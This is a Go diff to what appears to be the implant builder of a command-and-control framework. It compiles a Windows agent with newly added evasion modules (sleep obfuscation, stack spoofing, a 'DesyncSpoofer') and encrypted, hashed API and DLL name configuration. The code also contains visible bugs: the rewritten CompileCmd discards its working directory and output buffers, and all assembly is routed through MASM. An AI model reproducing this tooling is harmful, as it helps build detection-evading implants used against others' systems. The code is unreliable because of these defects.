@@ -26,7 +26,7 @@ type AgentBuilder struct {
 func NewImplantBuilder(ImpConfig *Types.ImplantConfig, path string) *AgentBuilder {
 	var builder = new(AgentBuilder)
 
-	builder.SourcePath = path + "/" + Types.PayloadDir + "/" + "Agent" + "/"
+	builder.SourcePath = path + "/" + Types.PayloadDir + "/" + "Agent"
 	builder.RSAKeyPath = path + "/" + "Config" + "/"
 
 	ConfigPath := path + "\\Config\\"
@@ -44,17 +44,37 @@ func NewImplantBuilder(ImpConfig *Types.ImplantConfig, path string) *AgentBuilde
 
 	builder.CompilerOptions.SourceDirs = []string{
 		"src/agent",
-		"src/Crypt",
+		"src/agent/evasion",
+		"src/agent/evasion/PeParsing",
+		"src/agent/evasion/SleepObfu",
+		"src/agent/evasion/stackspoof",
+		"src/crypt",
+		"src/crypt/wolfssl",
 		"src/cstdreplacement",
-		"src/Enumeration",
-		"src/Helpers",
-		"src/Http",
-		"src/Package",
-		"src/wolfssl",
+		"src/enumeration",
+		"src/helpers",
+		"src/http",
+		"src/package",
+		"src/TaskController",
 	}
 	builder.CompilerOptions.IncludeDirs = []string{
-		"include",
-		"include/wolfssl",
+		"headers/agent",
+		"headers/agent/common",
+		"headers/agent/evasion",
+		"headers/agent/evasion/PeParsing",
+		"headers/agent/evasion/SleepObfu",
+		"headers/agent/evasion/StackSpoof",
+		"headers/Crypt",
+		"headers/Crypt/wolfssl",
+		"headers/Crypt/wolfssl/wolfssl",
+		"headers/Crypt/wolfssl/wolfcrypt",
+		"headers/Crypt/wolfssl/openssl",
+		"headers/cstdReplacement",
+		"headers/enumeration",
+		"headers/helpers",
+		"headers/http",
+		"headers/package",
+		"headers/TaskController",
 	}
 
 	/*
@@ -105,7 +125,7 @@ func NewImplantBuilder(ImpConfig *Types.ImplantConfig, path string) *AgentBuilde
 		}
 	}
 
-	builder.CompilerOptions.Main.Exe = "src/main/main.c"
+	builder.CompilerOptions.Main.Exe = "main.c"
 
 	builder.PatchBinary = false
 
@@ -120,7 +140,7 @@ func (ab *AgentBuilder) Build() bool {
 	ab.CompileDir = "C:\\Windows\\Temp\\" + Types.PayloadDir + "\\"
 	err := os.Mkdir(ab.CompileDir, os.ModePerm)
 	if err != nil {
-		if err.Error() == "mkdir C:\\Windows\\Temp\\Payloads\\: Cannot create a file when that file already exists." {
+		if err.Error() == "mkdir C:\\Windows\\Temp\\"+Types.PayloadDir+"\\: Cannot create a file when that file already exists." {
 			log.Println("[info] compile directory already exists")
 		} else {
 			log.Println("[error] attempting to create compile directory: ", err.Error())
@@ -149,11 +169,9 @@ func (ab *AgentBuilder) Build() bool {
 	for _, v := range Types.ApiNameHashes {
 		HashConfig.AddUInt64(v)
 	}
-	HashConfig.AddString("advapi32.dll")
-	HashConfig.AddString("winhttp.dll")
-	HashConfig.AddString("User32.dll")
-	HashConfig.AddString("iphlpapi.dll")
-	HashConfig.AddString("cryptsp.dll")
+	for _, v := range Types.DllNames {
+		HashConfig.AddString(v)
+	}
 	EncryptedHashConfig, HashKey, HashIv, err := Crypt.AESCTREncrypt(HashConfig.GetBuffer())
 	if err != nil {
 		log.Println("[error] attempting to encrypt config: ", err)
@@ -269,12 +287,20 @@ func (ab *AgentBuilder) Build() bool {
 					AsmObj := ab.CompileDir + rand_name + ".o"
 					var AsmCompileStr []string
 					if ab.ImplantConfig.Arch == Types.ARCHITECTURE_X64 {
-						AsmCompileStr = append(AsmCompileStr, fmt.Sprintf(ab.CompilerOptions.Config.Nasm+" -f win64 %s -o %s", FilePath, AsmObj))
+						if strings.Compare(f.Name(), "DesyncSpoofer.x64.asm") == 0 { // our DesyncSpoofer is written for masm so in this special case we use it instead of nasm.
+							AsmCompileStr = append(AsmCompileStr, fmt.Sprintf("/c /Fo %s %s", AsmObj, FilePath))
+						} else {
+							AsmCompileStr = append(AsmCompileStr, fmt.Sprintf("-f win64 %s -o %s", FilePath, AsmObj))
+						}
 					} else {
-						AsmCompileStr = append(AsmCompileStr, fmt.Sprintf(ab.CompilerOptions.Config.Nasm+" -f win32 %s -o %s", FilePath, AsmObj))
+						AsmCompileStr = append(AsmCompileStr, fmt.Sprintf("-f win32 %s -o %s", FilePath, AsmObj))
 					}
 					ab.FilesCreated = append(ab.FilesCreated, AsmObj)
-					ab.CompileCmd(AsmCompileStr)
+
+					for _, s := range AsmCompileStr {
+						ab.CompileCmd(strings.Split(s, " "), Types.MASM)
+					}
+
 					CompilerCommand = append(CompilerCommand, AsmObj)
 				}
 			} else if path.Ext(f.Name()) == ".c" {
@@ -312,7 +338,7 @@ func (ab *AgentBuilder) Build() bool {
 	}
 	CompilerCommand = append(CompilerCommand, "-o"+ab.OutputPath)
 
-	Success := ab.CompileCmd(CompilerCommand)
+	Success := ab.CompileCmd(CompilerCommand, Types.SRC)
 	return Success
 }
 
@@ -433,9 +459,9 @@ func (ab *AgentBuilder) SetOutputPath(path string) {
 	ab.OutputPath = path
 }
 
-func (ab *AgentBuilder) CompileCmd(cmd []string) bool {
+func (ab *AgentBuilder) CompileCmd(cmd []string, CompilationType int) bool {
 	var (
-		CommandLine = exec.Command("gcc")
+		CommandLine exec.Cmd
 		stdout      bytes.Buffer
 		stderr      bytes.Buffer
 		err         error
@@ -444,7 +470,18 @@ func (ab *AgentBuilder) CompileCmd(cmd []string) bool {
 	CommandLine.Dir = ab.SourcePath
 	CommandLine.Stdout = &stdout
 	CommandLine.Stderr = &stderr
-	CommandLine.Args = append(CommandLine.Args, cmd...)
+
+	// handle special case we're compiling our asm objects using masm gcc command will come next
+	if CompilationType == Types.MASM {
+		CommandLine = *exec.Command(ab.CompilerOptions.Config.Masm)
+		CommandLine.Args = append(CommandLine.Args, cmd...)
+	} else if CompilationType == Types.NASM {
+		CommandLine = *exec.Command(ab.CompilerOptions.Config.Nasm)
+		CommandLine.Args = append(CommandLine.Args, cmd...)
+	} else {
+		CommandLine = *exec.Command("gcc")
+		CommandLine.Args = append(CommandLine.Args, cmd...)
+	}
 
 	//TODO remove debug output
 	log.Println("[info] compiling agent with command: ", CommandLine.Args)
